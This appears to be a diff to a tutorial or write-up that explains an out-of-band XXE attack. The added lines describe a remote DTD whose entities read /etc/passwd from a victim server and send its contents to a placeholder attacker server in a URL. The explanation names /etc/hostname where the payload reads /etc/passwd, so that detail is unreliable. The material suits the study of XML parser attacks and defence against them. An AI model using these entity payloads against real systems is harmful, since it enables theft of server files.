@@ -106,6 +106,8 @@ The `poc.dtd` file, hosted on the attacker's server, contains the actual exfiltr
 ```
 1. <!ENTITY % file SYSTEM "file:///etc/passwd">: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the <code>/etc/hostname</code> file from the victim server's filesystem.
 
+2. <!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">: This is a nested entity. It defines a parameter entity <b>%ent</b> whose value is the full declaration for a general entity named <b>data</b>. This nested entity is a key part of the attack because it ensures that the file content (%file) is read and included within the URL of the final request
+
 
 
 
